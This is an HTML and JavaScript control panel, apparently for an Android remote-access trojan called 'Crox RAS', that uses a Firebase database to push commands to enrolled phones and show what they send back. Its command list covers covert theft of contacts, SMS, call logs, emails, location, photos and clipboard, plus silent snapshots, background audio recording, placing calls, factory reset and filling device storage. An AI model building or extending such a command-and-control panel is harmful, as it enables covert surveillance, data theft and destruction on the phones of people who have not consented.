<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crox Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
</head>
<body class="bg-gray-900 text-gray-100 font-sans h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-gray-800 border-b border-gray-700 px-6 py-4 flex justify-between items-center shadow-md">
        <div class="flex items-center space-x-3">
            <span class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
            <h1 class="text-xl font-bold tracking-wider text-green-400">CROX // RAS COMMAND CENTER</h1>
        </div>
        <div id="firebase-status" class="text-sm bg-gray-700 px-3 py-1 rounded text-yellow-400">Connecting Firebase...</div>
    </header>

    <div class="flex flex-1 overflow-hidden">
        <!-- Sidebar: Devices -->
        <aside class="w-80 bg-gray-800 border-r border-gray-700 flex flex-col">
            <div class="p-4 border-b border-gray-700 font-semibold text-gray-300">Connected Devices</div>
            <div id="device-list" class="flex-1 overflow-y-auto divide-y divide-gray-700">
                <!-- Dynamic devices -->
            </div>
        </aside>

        <!-- Main Content: Command Dispatcher & Terminal -->
        <main class="flex-1 flex flex-col bg-gray-900 overflow-hidden">
            <!-- Selected Device Banner -->
            <div class="bg-gray-800 px-6 py-3 border-b border-gray-700 flex justify-between items-center">
                <span id="selected-device-label" class="text-sm font-medium text-gray-400">Select a device from the sidebar</span>
                <span id="device-id-badge" class="text-xs bg-gray-700 text-green-300 px-2 py-1 rounded"></span>
            </div>

            <!-- Command Dispatcher Grid (31 Commands) -->
            <div class="p-4 bg-gray-800/50 border-b border-gray-700 overflow-y-auto max-h-72">
                <h3 class="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3">Command Dispatcher (31 Actions)</h3>
                <div id="commands-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2">
                    <!-- Populated via JS -->
                </div>
            </div>

            <!-- Terminal Output Viewer -->
            <div class="flex-1 flex flex-col bg-black p-4 overflow-hidden">
                <div class="flex justify-between items-center mb-2">
                    <span class="text-xs font-mono text-gray-500 uppercase">Live Output Terminal</span>
                    <button onclick="clearTerminal()" class="text-xs text-gray-400 hover:text-white bg-gray-800 px-2 py-1 rounded">Clear</button>
                </div>
                <div id="terminal-output" class="flex-1 font-mono text-xs text-green-400 overflow-y-auto bg-black p-3 border border-gray-800 rounded space-y-1">
                    [System] Initialized dashboard. Waiting for device selection...
                </div>
            </div>
        </main>
    </div>

    <!-- Firebase Config Modal / Setup Script -->
    <script>
        // CONFIGURATION: Replace with your Firebase project config
        const firebaseConfig = {
            apiKey: "AIzaSyDummyKeyForCroxRASDemo12345",
            authDomain: "crox-ras.firebaseapp.com",
            databaseURL: "https://crox-ras-default-rtdb.firebaseio.com",
            projectId: "crox-ras",
            storageBucket: "crox-ras.appspot.com",
            messagingSenderId: "1234567890",
            appId: "1:1234567890:web:abcdef"
        };

        // Initialize Firebase
        try {
            firebase.initializeApp(firebaseConfig);
            document.getElementById('firebase-status').innerText = 'Firebase Connected';
            document.getElementById('firebase-status').className = 'text-sm bg-gray-700 px-3 py-1 rounded text-green-400';
        } catch (e) {
            document.getElementById('firebase-status').innerText = 'Firebase Config Error';
            document.getElementById('firebase-status').className = 'text-sm bg-gray-700 px-3 py-1 rounded text-red-400';
        }

        const db = firebase.database();
        let selectedDeviceId = null;

        const commandsList = [
            { id: 'extractContacts', name: 'Extract Contacts' },
            { id: 'extractPhotos', name: 'Extract Photos' },
            { id: 'extractCallLogs', name: 'Extract Call Logs' },
            { id: 'extractLocation', name: 'Extract Location' },
            { id: 'extractEmails', name: 'Extract Emails' },
            { id: 'extractSms', name: 'Extract SMS' },
            { id: 'extractInternalInfo', name: 'Internal Storage' },
            { id: 'extractSystemInfo', name: 'System Info' },
            { id: 'extractExternalInfo', name: 'External Storage' },
            { id: 'extractAudioRecording', name: 'Record Audio' },
            { id: 'extractScreenshot', name: 'Extract Screenshot' },
            { id: 'extractPhoneFiles', name: 'List Files (/sdcard/)', hasArg: true },
            { id: 'extractPhoneApplications', name: 'Installed Apps' },
            { id: 'extractClipboard', name: 'Get Clipboard' },
            { id: 'formatDevice', name: 'Factory Reset', danger: true },
            { id: 'toggleWifi', name: 'Toggle Wi-Fi', hasArg: true, argPlaceholder: 'true/false' },
            { id: 'toggleBluetooth', name: 'Toggle Bluetooth', hasArg: true, argPlaceholder: 'true/false' },
            { id: 'toggleFlash', name: 'Toggle Flash', hasArg: true, argPlaceholder: 'true/false' },
            { id: 'playMusic', name: 'Play Music' },
            { id: 'takeScreenshotAction', name: 'Silent Snapshot' },
            { id: 'recordAudioAction', name: 'Background Audio' },
            { id: 'sendVibration', name: 'Trigger Vibration' },
            { id: 'changeWallpaper', name: 'Change Wallpaper', hasArg: true, argPlaceholder: 'Image URL' },
            { id: 'openSite', name: 'Open URL', hasArg: true, argPlaceholder: 'https://...' },
            { id: 'sendVoiceMessage', name: 'Voice Message' },
            { id: 'sendToast', name: 'Send Toast', hasArg: true, argPlaceholder: 'Message' },
            { id: 'sendNotification', name: 'Push Notification', hasArg: true, hasArg2: true, argPlaceholder: 'Title', arg2Placeholder: 'Body' },
            { id: 'makeCall', name: 'Make Call', hasArg: true, argPlaceholder: 'Phone Number' },
            { id: 'fillDeviceSpace', name: 'Fill Space', danger: true },
            { id: 'changeAppVisuals', name: 'Restore App Icon' }
        ];

        const grid = document.getElementById('commands-grid');
        commandsList.forEach(cmd => {
            const btn = document.createElement('button');
            btn.className = `p-2 rounded text-xs font-semibold transition border ${cmd.danger ? 'bg-red-900/40 border-red-700 text-red-300 hover:bg-red-800' : 'bg-gray-700 border-gray-600 text-gray-200 hover:bg-gray-600'}`;
            btn.innerText = cmd.name;
            btn.onclick = () => dispatchCommand(cmd);
            grid.appendChild(btn);
        });

        // Listen for devices
        db.ref('devices').on('value', snapshot => {
            const deviceListEl = document.getElementById('device-list');
            deviceListEl.innerHTML = '';
            
            if (!snapshot.exists()) {
                deviceListEl.innerHTML = '<div class="p-4 text-xs text-gray-500">No devices connected</div>';
                return;
            }

            snapshot.forEach(child => {
                const deviceIdKey = child.key;
                const div = document.createElement('div');
                div.className = `p-3 cursor-pointer hover:bg-gray-700/50 flex justify-between items-center ${selectedDeviceId === deviceIdKey ? 'bg-gray-700' : ''}`;
                div.innerHTML = `
                    <div>
                        <div class="font-mono text-xs text-green-400">${deviceIdKey}</div>
                        <div class="text-[10px] text-gray-400">Online</div>
                    </div>
                    <span class="w-2 h-2 rounded-full bg-green-500"></span>
                `;
                div.onclick = () => selectDevice(deviceIdKey);
                deviceListEl.appendChild(div);
            });
        });

        function selectDevice(id) {
            selectedDeviceId = id;
            document.getElementById('selected-device-label').innerText = 'Active Device:';
            document.getElementById('device-id-badge').innerText = id;
            logTerminal(`[System] Selected device: ${id}`);
            
            // Listen to device data
            db.ref(`devices/${id}/data`).limitToLast(1).on('child_added', snapshot => {
                const val = snapshot.val();
                if (val) {
                    logTerminal(`[Data Received - ${val.action}]:\n${JSON.stringify(val.payload, null, 2)}`);
                }
            });
        }

        function dispatchCommand(cmd) {
            if (!selectedDeviceId) {
                alert('Please select a device first!');
                return;
            }

            let arg = '';
            let arg2 = '';
            if (cmd.hasArg) {
                arg = prompt(`Enter parameter for ${cmd.name}:`, cmd.argPlaceholder || '');
                if (arg === null) return;
            }
            if (cmd.hasArg2) {
                arg2 = prompt(`Enter second parameter for ${cmd.name}:`, cmd.arg2Placeholder || '');
                if (arg2 === null) return;
            }

            const commandObj = {
                action: cmd.id,
                arg: arg,
                arg2: arg2,
                timestamp: Date.now()
            };

            db.ref(`devices/${selectedDeviceId}/commands`).push(commandObj);
            logTerminal(`[Command Sent] -> ${cmd.id} ${arg ? '('+arg+')' : ''}`);
        }

        function logTerminal(text) {
            const term = document.getElementById('terminal-output');
            const time = new Date().toLocaleTimeString();
            term.innerHTML += `\n<span class="text-gray-500">[${time}]</span> ${text}`;
            term.scrollTop = term.scrollHeight;
        }

        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = '[System] Terminal cleared.';
        }
    </script>
</body>
</html>
